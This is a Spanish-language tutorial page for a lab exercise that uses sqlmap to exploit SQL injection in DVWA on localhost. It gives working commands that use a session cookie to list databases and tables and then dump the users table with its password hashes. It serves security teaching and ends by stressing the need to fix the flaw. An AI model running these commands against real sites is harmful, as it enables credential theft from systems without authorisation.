---
sidebar_position: 5
title: Automatización con sqlmap
---

# Automatización con sqlmap

**sqlmap** es una herramienta incluida en Kali Linux que detecta y explota inyecciones SQL de forma **automática**. Hace en segundos lo que en la sección anterior se hizo a mano, probando cientos de combinaciones por su cuenta.

## Paso 1. Obtener la cookie de sesión

sqlmap necesita entrar a DVWA como si fuera el usuario, así que se le entrega la **cookie de sesión**. Para conseguirla, en el navegador se presiona `F12`, se va a la pestaña **Application → Cookies**, y se copian los valores de `PHPSESSID` y de `security`.

## Paso 2. Detectar la vulnerabilidad y ver las bases de datos

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" --dbs
```

sqlmap confirma que el sitio es vulnerable y muestra la lista de bases de datos.

## Paso 3. Ver las tablas de la base "dvwa"

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" -D dvwa --tables
```

## Paso 4. Extraer el contenido de la tabla "users"

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" -D dvwa -T users --dump
```

Con este último comando, sqlmap descarga la tabla completa de usuarios y contraseñas. Incluso intenta descifrar los hash automáticamente.

## Comparación

La herramienta demuestra lo peligrosa que es esta vulnerabilidad: lo que una persona haría con esfuerzo probando consulta por consulta, un programa lo logra solo, de forma rápida y ordenada. Por eso es tan importante corregir el fallo en el código.
